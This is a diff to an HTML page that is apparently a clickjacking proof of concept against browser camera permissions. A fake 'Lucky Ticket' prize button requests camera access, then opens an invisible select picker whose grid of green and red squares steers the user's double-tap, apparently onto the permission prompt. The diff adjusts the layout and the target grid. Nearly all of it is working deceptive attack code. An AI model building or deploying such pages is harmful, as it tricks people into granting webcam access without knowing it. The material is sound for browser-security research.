@@ -9,11 +9,8 @@
       height: 100vh;
       overflow: hidden;
       text-align: center;
+      margin: 30vh 10vw;
       background-color: #7242E3;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
     }
 
     button {
@@ -23,16 +20,14 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
-      padding: 10px 20px;
-      margin-bottom: 40px;
     }
 
     select {
-      opacity: 0; /* Hidden select for triggering double-click */
-      position: absolute;
+      opacity: 0;
     }
   </style>
   <script>
+
     function requestCameraPermission() {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function (stream) {
@@ -44,34 +39,38 @@
     }
 
     function handleClick() {
-      requestCameraPermission();
-      setTimeout(function() {
-        document.getElementById("selectme").showPicker();
-      }, 250);
-    }
+        requestCameraPermission();
+        setTimeout(function() {
+          document.getElementById("selectme").showPicker();
+            }, 250);
+      }
 
-    function handleDoubleClick() {
-      alert("🎉 Congratulations! You won a free gift! 🎉");
-    }
   </script>
 </head>
 <body>
-
-  <button onclick="handleClick()">
-    🎉 Click to Open Your Lucky Ticket and Double-Tap [🟩] the Green Box to Win a Free Gift! 🎉
-  </button>
-
-  <div>
-    <select id="selectme" ondblclick="handleDoubleClick()">
-      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
-      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
-      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
-      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
-      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
-      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
-      <option>&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;</option>
-    </select>
-  </div>
+<center>
+    <button onclick="handleClick()">🎉 Click to Open Your Lucky Ticket and Double-Tap [🟩] the Green Box to Win a Free Gift! 🎉</button>
+</center>
+    
+<div>
+  <select id="selectme" ondblclick="handleDoubleClick()">
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E9;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+    <option></option>
+  </select>
+</div>
 
 </body>
 </html>
